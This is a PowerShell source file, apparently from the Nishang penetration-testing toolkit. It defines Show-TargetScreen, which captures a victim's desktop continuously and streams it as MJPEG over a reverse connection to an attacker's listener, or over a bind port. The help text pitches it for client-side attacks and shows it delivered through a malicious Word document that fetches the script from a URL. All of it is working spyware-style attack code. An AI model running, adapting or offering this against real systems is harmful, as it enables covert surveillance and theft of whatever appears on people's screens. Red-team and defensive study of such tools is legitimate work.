
function Show-TargetScreen
{
<#
.SYNOPSIS
Nishang script which can be used for streaming a target's desktop using MJPEG.

.DESCRIPTION
This script uses MJPEG to stream a target's desktop in real time. It is able to connect to a standard netcat listening
on a port when using the -Reverse switch. Also, a standard netcat can connect to this script Bind to a specific port.

A netcat listener which relays connection to a local port could be used as listener. A browser which supports MJPEG (Firefox) 
should then be pointed to the local port to see the remote desktop.

The script should be used with Client Side Attacks. 

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Show-TargetScreen -Reverse -IPAddress 192.168.2301.1 -Port 443

Above shows an example of aa reverse connection. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Out-Word -PayloadURL "http://192.168.1.6/Show-TargetScreen.ps1" -Arguments "Show-TargetScreen -Reverse -IPAddress 192.168.1.6 -Port 443"

Above shows an example using the script in a client side attack. 

.EXAMPLE
PS > Show-TargetScreen -Bind -Port 1234

Above shows an example of bind mode. Point Firefox to the IPAddress of the target and given port to see user's Desktop.


.LINK
http://www.labofapenetrationtester.com/2015/12/stream-targets-desktop-using-mjpeg-and-powershell.html
https://github.com/samratashok/nishang
#>   
    
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )
    
    while ($true)
    {
        try
        {
            Add-Type -AssemblyName System.Windows.Forms
            [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream

            #Connect back if the reverse switch is used.
            if ($Reverse)
            {
                $socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
                $socket.Connect($IPAddress,$Port)
                Write-Verbose "Connected to $IPAddress"
            }

            #Bind to the provided port if Bind switch is used.
            if ($Bind)
            {
                #Start a listener
                $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $Port)
                $server = new-object System.Net.Sockets.TcpListener $endpoint
                $server.Start()
                $buffer = New-Object byte[] 1024
                $socket = $server.AcceptSocket()
        
            } 
    
        
            #https://evilevelive.wordpress.com/2009/03/09/web-server-written-in-powershell/
            function SendResponse($sock, $string)
            {
                if ($sock.Connected)
                {
                    $bytesSent = $sock.Send(
                    $string)
                    if ( $bytesSent -eq -1 )
                    {
                        Write-Output "Send failed to " + $sock.RemoteEndPoint
                    }
                }
            }

            function SendStrResponse($sock, $string)
            {
                if ($sock.Connected)
                {
                    $bytesSent = $sock.Send(
                    [text.Encoding]::Ascii.GetBytes($string))
                    if ( $bytesSent -eq -1 )
                    {
                        Write-Output ("Send failed to " + $sock.RemoteEndPoint)
                    }
                }
            }
            #Create the header for MJPEG stream
            function SendHeader(
                [net.sockets.socket] $sock,
                $length,
                $statusCode = "200 OK",
                $mimeHeader="text/html",
                $httpVersion="HTTP/1.1"
                )
            {
                $response = "HTTP/1.1 $statusCode`r`n" +
                "Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n"
                SendStrResponse $sock $response
                Write-Verbose "Header sent to $IPAddress"
            }

            #Send the header
            SendHeader $socket

            while ($True)
            {

                $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                $g = [System.Drawing.Graphics]::FromImage($b)
                $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size)
                $g.Dispose()
                $MemoryStream.SetLength(0)
                $b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg))
                $b.Dispose()
                $length = $MemoryStream.Length
                [byte[]] $Bytes = $MemoryStream.ToArray()
        
                #Set the boundary for the multi-part request
                $str = "`n`n--boundary`n" +
                "Content-Type: image/jpeg`n" +
                "Content-Length: $length`n`n"
        
                #Send Requests
                SendStrResponse $socket $str
                SendResponse $socket $Bytes
            }
            $MemoryStream.Close()
        }
        catch
        {
            Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
            Write-Error $_
        }
    }
}



